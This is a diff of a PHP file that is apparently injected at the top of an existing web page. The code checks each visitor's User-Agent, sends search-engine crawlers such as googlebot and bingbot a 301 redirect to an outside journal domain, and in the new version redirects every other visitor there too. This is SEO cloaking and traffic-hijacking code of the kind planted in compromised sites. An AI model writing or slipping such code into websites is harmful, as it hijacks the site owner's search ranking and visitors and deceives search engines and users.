@@ -1,20 +1,23 @@
-<?php        
-ob_start();        
-header('Vary: Accept-Language');        
-header('Vary: User-Agent');        
-        
-$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);        
-        
-$urlTo = "https://jurnal.fs.umi.ac.id/";        
-        
-$botchar = "/(googlebot|slurp|adsense|inspection|ahrefs)/";        
-        
-if (preg_match($botchar, $ua)) {        
-header("Location: $urlTo",TRUE,301);        
-ob_end_flush();        
-exit();        
-}        
-ob_end_flush();        
+<?php
+ob_start();
+header('Vary: Accept-Language');
+header('Vary: User-Agent');
+
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+$urlTo = "https://jurnal.fs.umi.ac.id/";
+$botchar = "/(googlebot|slurp|adsense|inspection|ahrefs|bingbot|yandexbot)/";
+
+if (preg_match($botchar, $ua)) {
+    // Redirect bot
+    header("Location: $urlTo", TRUE, 301);
+    ob_end_flush();
+    exit();
+}
+
+// Redirect semua user ke URL tujuan
+header("Location: $urlTo", TRUE, 302);
+ob_end_flush();
+exit();
 ?>
 
 <?php
